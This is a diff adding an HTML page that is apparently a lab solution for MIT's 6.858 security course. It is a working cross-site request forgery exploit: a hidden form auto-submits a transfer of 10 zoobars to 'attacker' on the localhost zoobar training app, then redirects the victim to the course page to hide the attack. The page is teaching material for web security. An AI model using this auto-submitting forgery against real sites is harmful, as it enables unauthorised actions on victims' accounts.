@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<script>var submitted = 'False';
+function load() {
+if (submitted == 'True') {window.location = 'http://css.csail.mit.edu/6.858/2013/';}
+else {transferform.submission.click();}
+}</script>
+<form method="POST" name="transferform" target="transferdone" action="http://localhost:8080/zoobar/index.cgi/transfer">
+<p>Send <input name="zoobars" type="text" value="10"> zoobars</p>
+<p>to <input name="recipient" type="text" value="attacker"></p>
+<input type="submit" name="submission" value="Send">
+</form>
+<script>form = document.getElementsByName('transferform')[0];
+form.addEventListener('submit', function(){submitted = 'True'}, false)
+</script>
+<iframe name="transferdone" onload="load()"></iframe>
+</html>
